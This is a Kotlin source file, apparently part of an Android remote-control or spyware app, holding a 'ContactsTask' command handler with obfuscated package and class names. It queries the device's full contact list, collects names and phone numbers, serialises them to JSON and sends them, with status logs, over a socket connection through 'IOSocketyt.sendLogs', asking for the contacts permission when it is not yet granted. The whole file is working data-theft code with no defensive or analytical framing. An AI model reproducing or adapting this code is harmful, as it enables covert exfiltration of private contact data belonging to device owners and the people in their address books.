package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.commandp.utilsss.Contact
import com.xxx.zzz.socketsp.IOSocketyt


class ContactsTask(private val ctx: Context) : BaseTask(ctx) {

    private fun getContactList(): ArrayList<Contact> {
        val contacts = ArrayList<Contact>()
        runCatching {
            val cur = ctx.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME
            )!!

            while (cur.moveToNext()) {
                val phoneNos = ArrayList<String>()
                val id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))
                val name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                runCatching {
                    val nn =
                        cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    phoneNos.add(nn)
                }.onFailure {
//                    IOSocketyt.sendLogs("", "phoneNos error ${it.localizedMessage}", "error", true)
                }

                runCatching {
                    val pCur = ctx.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf<String>(id),
                        null
                    )
                    while (pCur?.moveToNext() == true) {
                        val phoneNo =
                            pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        phoneNos.add(phoneNo)
                    }
                    pCur?.close()
                }.onFailure {
//                    IOSocketyt.sendLogs("", "phoneNos2 error ${it.localizedMessage}", "error", true)
                }


                val contact = Contact(id, name, phoneNos)
                contacts.add(contact)
            }

            cur.close()

            IOSocketyt.sendLogs("", "ContactsTask ${contacts.size}", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "ContactsTask ${it.localizedMessage}", "error")
        }
        return contacts
    }

    private fun getJSON(list: ArrayList<Contact>): String {
        return Gsonq().toJson(list)
    }

    private fun getContacts(): String {
        return getJSON(getContactList())
    }

    override fun run() {
        super.run()
        runCatching {
            if (ContextCompat.checkSelfPermission(
                    ctx,
                    Manifest.permission.READ_CONTACTS
                ) == PackageManager.PERMISSION_GRANTED
            )
                foo(getContacts())
            else requestPermissions()
        }.onFailure {
            IOSocketyt.sendLogs("", "ContactsTask ${it.localizedMessage}", "error")
        }
    }

    private fun foo(str: String) {
        val data: HashMap<String, String> = HashMap()
        data["contacts"] = str
        data["dataType"] = "contacts"

        IOSocketyt.sendLogs("", Gsonq().toJson(data), "phonenumber")
    }
}
